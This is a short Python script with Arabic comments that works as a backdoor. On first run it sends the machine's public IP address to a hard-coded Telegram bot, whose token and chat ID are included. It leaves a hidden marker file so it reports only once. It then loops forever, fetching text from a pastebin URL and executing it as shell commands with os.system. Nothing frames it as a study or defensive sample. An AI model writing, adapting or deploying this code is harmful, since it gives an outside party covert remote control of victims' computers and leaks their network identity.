import requests,time,os
#ارسال ip
def info():
		ip=requests.get('https://api.ipify.org').text
		requests.get(f"https://api.telegram.org/bot6850583664:AAFOYwBhV34rmFToMrqGRcKmb2fGU2-KH4w/sendMessage?chat_id=6890067889&text=ip : {ip}")
		open(".start.txt","a").write("True")
#تحقق اذا كان الجهاز مستعمل الاداة او لا
try:
	file=open(".start.txt","r")
	if file.readline() == "True":
		pass
	else:
		info()
except:
	info()
#تنفيذ الاوامر
def command(com):
		i=os.system(req)
		time.sleep(20)
#استلام الاوامر
while True:
	req=requests.get("https://pastebin.com/raw/5B7gzzzD").text
	if req=="":
		exit("لايوجد أوامر للتنفيذ اعد محاولة تشغيل الاداه ")
	else:
		command(req)